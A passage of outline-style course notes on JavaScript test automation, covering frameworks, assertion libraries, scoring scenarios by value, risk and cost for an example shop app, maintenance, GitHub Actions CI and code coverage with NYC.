&nbsp;				□ Tests should be written as steps describing behaviors.

&nbsp;				□ Technical details should be abstracted into helper functions outside the test.

&nbsp;				□ Makes tests more human-readable and easier to maintain.

&nbsp;		○ Documentation \& Team Alignment

&nbsp;			• Teams should define and document chosen test design patterns.

&nbsp;			• Store patterns in a project README or guidelines.

&nbsp;			• Ensures new and existing teammates can follow the same structure and principles.



#### Testing Tools



Framework

&nbsp;	• A test framework is the foundation of a complete test automation project. Frameworks provide structure, consistency, and reusable code for tests, reducing setup time and improving collaboration. Different frameworks exist for different languages and testing needs (unit, integration, UI, BDD), so teams should evaluate options based on their project context.

&nbsp;	• Key Concepts

&nbsp;		○ Role of a Test Framework

&nbsp;			§ Provides a structured way to write and organize tests.

&nbsp;			§ Enables consistency across test suites.

&nbsp;			§ Supports reusable test code for common actions.

&nbsp;			§ Reduces the overhead of designing a test system from scratch.

&nbsp;		○ Popular Frameworks for JavaScript

&nbsp;			§ Mocha

&nbsp;				• Works well for Node.js apps.

&nbsp;				• Supports browser testing, async tests, built-in runner, and any assertion library.

&nbsp;			§ Jasmine

&nbsp;				• Framework-agnostic for JavaScript.

&nbsp;				• Doesn’t require a browser or DOM.

&nbsp;				• Clean, simple syntax, comes with its own runner.

&nbsp;			§ Jest

&nbsp;				• Created by Facebook, popular for React testing.

&nbsp;				• Zero configuration with new React projects.

&nbsp;				• Includes built-in runner, mocking, and code coverage reporting.

&nbsp;		○ UI Testing Frameworks

&nbsp;			§ Selenium

&nbsp;				• Classic UI automation tool.

&nbsp;				• Works with JavaScript and integrates with Mocha, Jasmine, Jest.

&nbsp;			§ Cucumber

&nbsp;				• Behavior-Driven Development (BDD) framework.

&nbsp;				• Uses plain language (Given-When-Then) to define tests.

&nbsp;				• Often paired with Selenium for UI scenarios.

&nbsp;			§ Cypress.io

&nbsp;				• Modern, fast, reliable UI testing framework.

&nbsp;				• Works directly in the browser.

&nbsp;				• Easy setup and widely used in modern web projects.

&nbsp;		○ Benefits of BDD Support

&nbsp;			§ Many frameworks support BDD (Behavior-Driven Development).

&nbsp;			§ Encourages writing tests in a clear, scenario-based format.

&nbsp;			§ Improves team collaboration, making tests understandable by non-technical stakeholders.

&nbsp;		○ Recommendations

&nbsp;			§ Using a prebuilt framework (e.g., Mocha, Jasmine, Jest, Cypress) is highly recommended:

&nbsp;				• Saves time → faster setup.

&nbsp;				• Provides proven structure.

&nbsp;				• Allows the team to focus on writing tests instead of building custom frameworks.

&nbsp;			§ Teams should investigate options and select the framework best aligned with their app type, language, and team workflow.



Assertion Library

&nbsp;	• Assertions are the core of automated testing, giving tests meaning by checking whether actual results match expected results. Different assertion libraries exist, each with their own syntax and features, but the goal is always the same: to make test results clear, readable, and reliable.

&nbsp;	• Key Concepts

&nbsp;		○ Role of Assertions

&nbsp;			§ Assertions validate outcomes of code execution.

&nbsp;			§ A test fails when an assertion shows that expected ≠ actual.

&nbsp;			§ They are the “backbone” of tests, turning code execution into meaningful pass/fail results.

&nbsp;		○ Types of Assertion Libraries

&nbsp;			§ Built-in libraries (no extra dependencies):

&nbsp;				• Assert → built into Node.js, simple and minimal.

&nbsp;				• Jasmine and Jest → come with their respective frameworks.

&nbsp;			§ Standalone / BDD-style libraries (optional for flexibility):

&nbsp;				• Chai → powerful with expect.to.equal style syntax, supports plugins and integrations.

&nbsp;				• Unexpected → very readable string-like syntax, highly extensible, works with any framework.

&nbsp;		○ Syntax \& Examples

&nbsp;			§ Assert → assert.equal(actual, expected)

&nbsp;			§ Jasmine / Jest → expect(actual).toEqual(expected)

&nbsp;			§ Chai → expect(actual).to.equal(expected)

&nbsp;			§ Unexpected → expect(actual, 'to equal', expected)

&nbsp;			§ All provide ways to express expected outcomes clearly, just with different wording.

&nbsp;		○ Best Practices

&nbsp;			§ Prefer using an assertion library that comes built-in (Node.js Assert, Jasmine, Jest) to avoid unnecessary dependencies.

&nbsp;			§ Choose a standalone library (e.g., Chai, Unexpected) if:

&nbsp;				• You need more flexibility or plugins.

&nbsp;				• You want syntax that feels more natural to your team.

&nbsp;			§ Focus on readability—assertions should make it obvious what’s being tested.

&nbsp;			§ Pick one style and stay consistent across the project.



Test Results

&nbsp;	• Once tests are written, they need to be run repeatedly, easily, and consistently. Test runners (like Mocha, Jasmine, or Jest) provide ways to execute tests and display results, and teams should ensure running tests is simple and results are clear and interpretable.

&nbsp;	• Key Concepts

&nbsp;		○ Importance of Running Tests

&nbsp;			• Tests are meant to be run over and over throughout development.

&nbsp;			• Running should be repeatable, quick, and reliable.

&nbsp;			• Results must provide confidence by being easy to read and interpret.

&nbsp;		○ Running Tests with Mocha (Example)

&nbsp;			• Run a single test file:	npx mocha test/unit/calculateTotalPrice.test.js

&nbsp;			Run all unit tests in a directory:	npx mocha test/unit/\*.js

&nbsp;			• Output displayed in the terminal shows test results (pass/fail, details).

&nbsp;		○ Using NPM Scripts

&nbsp;			• package.json → contains scripts section for test automation.

&nbsp;			• Example script:

&nbsp;				"unit-test": "mocha test/unit/\*.js"

&nbsp;			• Run with:

&nbsp;				npm run unit-test

&nbsp;			• Benefits:

&nbsp;				• Provides a shortcut for common test commands.

&nbsp;				• Can define multiple variations of test scripts (e.g., unit, integration, coverage).

&nbsp;		○ Frameworks \& Reporting

&nbsp;			• Jasmine and Jest run tests similarly (via CLI + configuration).

&nbsp;			• All major test frameworks provide basic built-in reporting (summary of results).

&nbsp;			• Reports can be customized or extended with other tools for more detailed output.

&nbsp;		○ Best Practices'

&nbsp;			• Keep test execution simple → one easy command.

&nbsp;			• Ensure results are readable and meaningful to developers and stakeholders.

&nbsp;			• Teams may enhance reports if more detail is important (e.g., HTML reports, CI/CD dashboards).



#### Decide What to Automate



Scenarios to Automate

&nbsp;	• When planning test automation, teams should brainstorm and identify scenarios worth automating for each new feature. The goal is to generate as many potential scenarios as possible, then refine them later. Automating common, high-value workflows (like adding items to a cart or checking out) ensures reliable coverage of critical user actions.

&nbsp;	• Key Concepts

&nbsp;		○ Brainstorming Scenarios

&nbsp;			• Take 10 minutes with the team for each new feature to write down all possible scenarios.

&nbsp;			• Don’t filter ideas at this stage—quantity over quality.

&nbsp;			• Capture even “off the wall” ideas; refinement comes later.

&nbsp;		○ Example: AI Animal Art Application

&nbsp;			• Key user workflows that can be turned into automated test scenarios:

&nbsp;				□ View products available for sale on homepage.

&nbsp;				□ Add item to cart (single item).

&nbsp;				□ Add multiple quantities of the same item to the cart.

&nbsp;				□ Add different types of items to the cart.

&nbsp;				□ View cart → confirm all items and total price are displayed.

&nbsp;				□ Update quantity of an item (e.g., cat item → quantity = 0 removes item).

&nbsp;				□ Update multiple item quantities or remove multiple items.

&nbsp;				□ Clear entire cart (last item set to zero empties cart).

&nbsp;				□ Verify cart updates correctly when items are removed.

&nbsp;				□ Checkout process → complete order successfully.

&nbsp;		○ Best Practices

&nbsp;			• Use common user journeys as inspiration (shopping flow, checkout flow, etc.).

&nbsp;			• Prioritize automating high-value, repetitive, and critical scenarios.

&nbsp;			• Understand that the initial list is not exhaustive; more scenarios will be added over time.



Give Each Scenario a Value

&nbsp;	• After brainstorming test scenarios, the next step is to evaluate and prioritize them by assigning a value score (1–5). This ensures that test automation efforts focus on the most important, distinct, and high-value features first, making testing more efficient and impactful.

&nbsp;	• Key Concepts

&nbsp;		○ Scoring System

&nbsp;			§ Use a 1–5 scale to assign value to each scenario.

&nbsp;			§ Criteria for scoring:

&nbsp;				□ Importance of the feature (business criticality).

&nbsp;				□ Likelihood of being fixed if broken (response priority).

&nbsp;				□ Distinctness of the scenario (how unique it is vs. overlapping with others).

&nbsp;		○ Team Involvement

&nbsp;			§ Scores should be assigned collaboratively with stakeholders.

&nbsp;			§ Use group judgment and discussion to align priorities.

&nbsp;			§ Helps create consensus and shared understanding of what matters most.

&nbsp;		○ Example Evaluations (AI Animal Art App)

&nbsp;			§ View Products for Sale → 5 (critical, distinct, must-have).

&nbsp;			§ Add Item to Cart → 5 (high importance, always fixed immediately).

&nbsp;			§ Add Multiple Items to Cart → 4 (important but less distinct).

&nbsp;			§ Remove Item from Cart → 4 (valuable but slightly lower than adding items).

&nbsp;			§ Checkout (Order) → 5 (highest importance, revenue-critical, always fixed first).

&nbsp;		○ Outcome

&nbsp;			§ Produces a prioritized list of scenarios ranked by value.

&nbsp;			§ Surfaces the most valuable tests to automate first.

&nbsp;			§ Ensures limited resources are used efficiently, covering business-critical paths.



Risk of Automation

&nbsp;	• After assigning value scores to test scenarios, teams should also assign risk scores (1–5). Risk scoring evaluates how critical a feature is by considering both its impact if broken and its probability of use by customers. This helps prioritize automation for the features most essential to user experience and business continuity.

&nbsp;	• Key Concepts

&nbsp;		○ Risk Scoring Method

&nbsp;			• Assign a score of 1–5 to each scenario.

&nbsp;			• Based on two criteria:

&nbsp;				□ Impact → What happens to customers if the feature is broken?

&nbsp;				□ Probability of Use → How frequently will customers use this feature?

&nbsp;		○ Example Risk Evaluations (AI Animal Art App)

&nbsp;			• View Products for Sale → 5 (high impact, high probability).

&nbsp;			• Add Item to Cart → 5 (critical function, used frequently).

&nbsp;			• Add Multiple Items to Cart → 4 (important, frequently used, but slightly less critical).

&nbsp;			• Order Checkout → 5 (highest impact, essential for revenue, high use).

&nbsp;		○ Purpose of Risk Scoring

&nbsp;			• Surfaces the highest-risk features that require strong test coverage.

&nbsp;			• Ensures that automation prioritizes areas where failures would cause the greatest damage.

&nbsp;			• Complements value scoring by adding another dimension to prioritization.

&nbsp;		○ Outcome

&nbsp;			• Produces a risk-ranked list of scenarios.

&nbsp;			• Helps teams decide which tests are most critical to automate first.

&nbsp;			• Guides test planning toward features that are both high-value and high-risk.



The Cost of Automation

&nbsp;	• Beyond value and risk, teams must also consider the cost of automation when prioritizing test scenarios. Assigning a cost score (1–5) helps quantify the effort required to write and maintain tests, ensuring teams balance business impact with development effort when deciding what to automate.

&nbsp;	• Key Concepts

&nbsp;		○ Cost Scoring

&nbsp;			§ Assign a score of 1–5 for each scenario.

&nbsp;			§ Factors considered:

&nbsp;				□ Ease of writing the test script.

&nbsp;				□ Speed of implementation (how quickly it can be scripted).

&nbsp;		○ Example Cost Evaluations (AI Animal Art App)

&nbsp;			§ View Products for Sale → 5 (very easy and quick).

&nbsp;			§ Add Item to Cart → 5 (easy and quick).

&nbsp;			§ Remove Single Item from Cart → 4 (easy but depends on first adding an item).

&nbsp;			§ Remove Multiple Items from Cart → 3 (requires adding multiple items first, more setup).

&nbsp;			§ Order Checkout → 4 (easy but depends on prior cart setup).

&nbsp;		○ Insights

&nbsp;			§ Cost varies more widely than risk or value scores.

&nbsp;			§ Some tests are highly valuable and risky, but expensive to automate (due to dependencies or setup).

&nbsp;			§ Cost scoring provides a realistic view of effort vs. payoff.

&nbsp;		○ Purpose

&nbsp;			§ Helps teams prioritize automation by balancing:

&nbsp;				□ Value (business importance).

&nbsp;				□ Risk (impact + frequency of use).

&nbsp;				□ Cost (effort to automate).

&nbsp;			§ Supports informed decision-making about what scenarios should be automated first, and which might stay manual.



Select What to Automate

&nbsp;	• Once value, risk, and cost scores have been assigned to test scenarios, teams can use the combined data to prioritize which scenarios to automate. By summing the scores and applying a threshold, the team focuses on automating the highest-priority scenarios first, ensuring testing delivers maximum impact with available resources.

&nbsp;	• Key Concepts

&nbsp;		○ Using Combined Scoring

&nbsp;			§ Each scenario has three scores: Value + Risk + Cost.

&nbsp;			§ Add them up for a total score.

&nbsp;			§ Higher totals → stronger candidates for automation.

&nbsp;		○ Example Scoring Scale

&nbsp;			§ 13–15 points → Automate these scenarios.

&nbsp;			§ 12 or less → Do not automate (or lower priority).

&nbsp;			§ Note: Thresholds can vary depending on team needs and project scope.

&nbsp;		○ Benefits of the Approach

&nbsp;			§ Provides a quantitative method for selecting automation candidates.

&nbsp;			§ Balances business importance (value), user impact (risk), and effort (cost).

&nbsp;			§ Helps teams avoid over-investing in low-value or high-cost scenarios.

&nbsp;		○ Flexibility

&nbsp;			§ The model is not rigid—adapt thresholds and scoring methods to fit project or organizational needs.

&nbsp;			§ Recognizes that not all features will score highly, but ensures resources go to top-priority scenarios first.

&nbsp;			§ Lower-priority scenarios may still be tested manually.



#### Adopt Test Automation



Maintain Standards

&nbsp;	• Test automation is an ongoing process that requires consistent investment, discipline, and adherence to good standards. By focusing on value, reliability, and speed, teams can maintain a healthy, sustainable, and effective test suite over time.

&nbsp;	• Key Concepts

&nbsp;		○ Valuable Tests

&nbsp;			• Tests should always deliver meaningful value.

&nbsp;			• Quality over quantity → focus on important scenarios, not just number of tests.

&nbsp;			• Regularly review and improve existing tests (e.g., retrospectives).

&nbsp;			• Treat test code like production code—maintain it, refactor it, and keep it clean.

&nbsp;		○ Reliable Tests

&nbsp;			• Tests must provide the same results consistently.

&nbsp;			• Have a plan for handling failures (since they’re inevitable).

&nbsp;			• Make tests independent—execution of one test should not affect others.

&nbsp;			• Run tests in a dedicated environment to prevent interference from other processes.

&nbsp;		○ Fast Tests

&nbsp;			• Speed matters for fast build times and quicker releases.

&nbsp;			• Use parallelization to run multiple tests concurrently.

&nbsp;			• Limit UI tests (which are slower) and focus more on lower-level tests (unit/integration) for faster feedback.

&nbsp;		○ Long-Term Sustainability

&nbsp;			• Following these three rules ensures a test suite that is:

&nbsp;				□ Valuable (aligned with business needs).

&nbsp;				□ Reliable (trustworthy results).

&nbsp;				□ Fast (efficient feedback loop).

&nbsp;			• A disciplined approach makes a huge difference over time as the project grows.



Make a Maintenance Plan

&nbsp;	• Test automation is not a one-time effort—it requires ongoing maintenance to remain effective. A solid maintenance plan addresses adding new tests, updating existing ones, and fixing failures, ensuring the test suite stays relevant, reliable, and supports continuous delivery with confidence.

&nbsp;	• Key Concepts

&nbsp;		○ Adding New Tests

&nbsp;			§ Every new feature requires new automated tests.

&nbsp;			§ Teams working on new functionality should discuss:

&nbsp;				□ How the feature will be tested.

&nbsp;				□ What types of tests (unit, integration, UI) will be created.

&nbsp;		○ Updating Old Tests

&nbsp;			§ Applications evolve over time, making some tests outdated.

&nbsp;			§ Maintenance activities include:

&nbsp;				□ Updating test data.

&nbsp;				□ Adjusting assertions to reflect changed functionality.

&nbsp;				□ Deleting irrelevant tests if features are removed or redesigned.

&nbsp;		○ Fixing Failures

&nbsp;			§ Builds must always stay green (passing).

&nbsp;			§ Failures fall into two categories:

&nbsp;				□ Flaky/random failures → Mitigate by rerunning or isolating them until stabilized.

&nbsp;				□ Legitimate failures → Investigate immediately, as they may signal a real bug.

&nbsp;					® Requires fixing the bug or reverting the code that introduced it.

&nbsp;		○ Best Practices for Maintenance

&nbsp;			§ Isolate flaky tests to prevent them from blocking reliable builds.

&nbsp;			§ Continuously improve flaky tests before reintroducing them into the main suite.

&nbsp;			§ Prioritize fixing legitimate failures quickly to maintain trust in the suite.

&nbsp;			§ Regularly revisit the test suite to ensure it reflects the current state of the application.

&nbsp;		○ Outcome

&nbsp;			§ A clear maintenance plan ensures that:

&nbsp;				□ New features are covered.

&nbsp;				□ Old/irrelevant tests don’t clutter the suite.

&nbsp;				□ Failures are handled systematically.

&nbsp;			§ This creates a robust, sustainable automation suite that evolves with the product.



Use Continuous Integration

&nbsp;	• Continuous Integration (CI) is the best way to repeatedly and reliably run automated tests across environments. CI ensures that tests run automatically on code changes or scheduled intervals, providing faster feedback, catching bugs earlier, and maintaining software quality.

&nbsp;	• Key Concepts

&nbsp;		○ Purpose of Continuous Integration

&nbsp;			§ Automated tests can be run over and over consistently.

&nbsp;			§ CI enables tests to be triggered:

&nbsp;				□ On code pushes (e.g., to GitHub).

&nbsp;				□ On pull requests.

&nbsp;				□ On a schedule (e.g., hourly or nightly).

&nbsp;			§ Benefit: Catches bugs earlier compared to manual, ad hoc local testing.

&nbsp;		○ Choosing a CI Solution

&nbsp;			§ Many CI tools are available (e.g., Jenkins, CircleCI, GitHub Actions).

&nbsp;			§ Criteria to consider:

&nbsp;				□ Cost

&nbsp;				□ Ease of use

&nbsp;				□ Maintenance overhead

&nbsp;				□ Support

&nbsp;		○ Example: GitHub Actions Setup

&nbsp;			§ GitHub Actions provides free CI for public repos.

&nbsp;			§ Workflow is defined in a YAML file (.github/workflows/node.js.yaml).

&nbsp;			§ Example configuration:

&nbsp;				□ Triggered on push or pull request to main.

&nbsp;				□ Runs on Ubuntu with a Node.js version matrix (can be limited to latest).

&nbsp;				□ Steps:

&nbsp;					® Checkout project.

&nbsp;					® Install dependencies (npm ci).

&nbsp;					® Start server (npm start \&).

&nbsp;					® Run unit tests (npm run unit-test).

&nbsp;					® Run integration tests (npm run integration-test).

&nbsp;					® Run UI tests (npm run UI-test).

&nbsp;		○ Workflow Execution

&nbsp;			§ Once committed, workflows appear in the Actions tab of the repo.

&nbsp;			§ Developers can view:

&nbsp;				□ Build status (pending, success, failed).

&nbsp;				□ Detailed logs of each step.

&nbsp;			§ Example: build completed successfully in 35 seconds.

&nbsp;		○ Benefits of CI for Automated Testing

&nbsp;			§ Reliability: Ensures tests run consistently in controlled environments.

&nbsp;			§ Early detection: Bugs caught sooner in the pipeline.

&nbsp;			§ Speed: Automates repetitive validation, speeding up delivery.

&nbsp;			§ Transparency: Team can see real-time test results and build history.



Measure Code Coverage

&nbsp;	• Code coverage is a widely used metric for evaluating automated tests. It shows what percentage of the application’s code is executed during testing, helping teams identify well-tested and under-tested areas. While coverage tools provide valuable insights, coverage should be used as a guidance metric—not a strict target—to avoid focusing on numbers instead of meaningful tests.

&nbsp;	• Key Concepts

&nbsp;		○ What Code Coverage Measures

&nbsp;			§ Statement coverage → percentage of statements executed.

&nbsp;			§ Branch coverage → percentage of decision branches tested (if/else paths).

&nbsp;			§ Function coverage → percentage of functions invoked.

&nbsp;			§ Line coverage → percentage of lines executed.

&nbsp;		○ Benefits of Code Coverage

&nbsp;			§ Helps visualize test quality (what’s covered vs. uncovered).

&nbsp;			§ Identifies gaps in test coverage.

&nbsp;			§ Coverage tools are often free and easy to set up, especially for open-source projects.

&nbsp;			§ Provides reports that highlight coverage in color (green = high, yellow = medium, red = low).

&nbsp;		○ Example: Istanbul / NYC

&nbsp;			§ Istanbul is a popular tool for JavaScript projects.

&nbsp;			§ NYC is its CLI interface.

&nbsp;			§ Setup:

&nbsp;				□ Install with npm install --save-dev nyc.

&nbsp;				□ Add a test-coverage script in package.json (e.g., "nyc mocha test").

&nbsp;				□ Run with npm run test-coverage.

&nbsp;			§ Generates a report showing coverage by file, including uncovered lines.

&nbsp;		○ Best Practices

&nbsp;			§ Always measure coverage to inform test improvement.

&nbsp;			§ Don’t chase 100% coverage:

&nbsp;				□ It may lead to writing unnecessary or low-value tests.

&nbsp;				□ Can increase maintenance cost without improving quality.

&nbsp;			§ Instead, focus on:

&nbsp;				□ High-value scenarios.

&nbsp;				□ Areas with low or critical coverage.

&nbsp;				□ Using coverage data to make informed test decisions.







